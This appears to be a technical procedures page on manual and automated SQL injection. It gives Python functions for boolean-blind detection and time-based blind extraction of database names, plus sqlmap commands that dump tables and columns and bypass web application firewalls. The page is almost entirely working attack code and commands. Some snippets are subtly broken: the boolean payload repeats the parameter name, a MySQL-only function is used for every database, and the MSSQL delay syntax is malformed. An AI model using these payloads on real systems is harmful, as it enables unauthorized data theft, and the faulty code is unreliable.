# Deep Technical Procedures

## Manual SQLi Testing

### Boolean-Based Blind Detection
```python
import requests

def test_boolean_blind(url, param, success_string):
    # Test true condition
    payload_true = f"{param}=1' AND 1=1-- -"
    response_true = requests.get(url, params={param: payload_true})

    # Test false condition
    payload_false = f"{param}=1' AND 1=2-- -"
    response_false = requests.get(url, params={param: payload_false})

    if success_string in response_true.text and success_string not in response_false.text:
        return "Boolean-based SQLi confirmed"
    return "Not vulnerable or incomplete"
```

### Time-Based Blind Exploitation
```python
import requests
import time

def extract_dbms_timebased(url, param, dbms='mysql'):
    delay_functions = {
        'mysql': "IF((condition),SLEEP(2),0)",
        'postgresql': "CASE WHEN (condition) THEN pg_sleep(2) ELSE 0 END",
        'mssql': "IF((condition) WAITFOR DELAY '0:0:2')"
    }
    
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    extracted = ''
    
    for pos in range(1, 20):
        found = False
        for char in characters:
            delay_fn = delay_functions[dbms]
            condition = f"SUBSTRING(database(),{pos},1)='{char}'"
            payload = f"' UNION SELECT {delay_fn.replace('(condition)', condition)}-- -"
            
            start = time.time()
            requests.get(url, params={param: payload}, timeout=10)
            elapsed = time.time() - start
            
            if elapsed >= 2:
                extracted += char
                found = True
                break
        
        if not found:
            break
    
    return extracted
```

## Automated Detection with sqlmap

```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1" --batch --level 3 --risk 2

# With cookie and POST data
sqlmap -u "http://target.com/api/login" --data="username=admin&password=test" \
  --cookie="session=abc123" --level 5 --batch

# Database enumeration
sqlmap -u "https://target.com/products?id=1" --dbms=mysql --batch \
  -D targetdb --tables --columns --dump

# WAF bypass
sqlmap -u "https://target.com/search?q=test" --level 5 --risk 3 \
  --tamper=space2comment --random-agent --batch
```
